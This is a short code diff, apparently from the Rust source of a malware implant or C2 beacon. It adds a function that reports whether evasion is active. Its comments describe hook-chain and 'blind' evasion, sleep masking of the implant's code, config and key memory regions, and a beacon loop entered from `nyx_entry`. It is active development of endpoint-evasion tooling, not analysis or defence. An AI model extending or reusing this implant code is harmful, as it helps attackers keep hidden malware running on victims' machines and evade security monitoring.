@@ -65,6 +65,15 @@ pub fn set_evasion_off() {
     EVASION_ACTIVE.store(false, core::sync::atomic::Ordering::Release);
 }
 
+/// Whether the full evasion init (hookchain/blind/mask-region registration)
+/// ran. When false (noevasion mode — `init_minimal` path), sleep masking must
+/// NOT engage because `mem::mask()` never registered the .text/config/key
+/// regions, and fluctuation would crash on the unmask step. `kits::sleep`
+/// gates on this before routing to `fluctuation::sleep`.
+pub fn evasion_active() -> bool {
+    EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire)
+}
+
 /// The beacon loop, called from `nyx_entry` after resolve + alloc bootstrap.
 pub unsafe fn beacon_loop() {
     crate::entry::diag_mark(b"L0_loop_start");
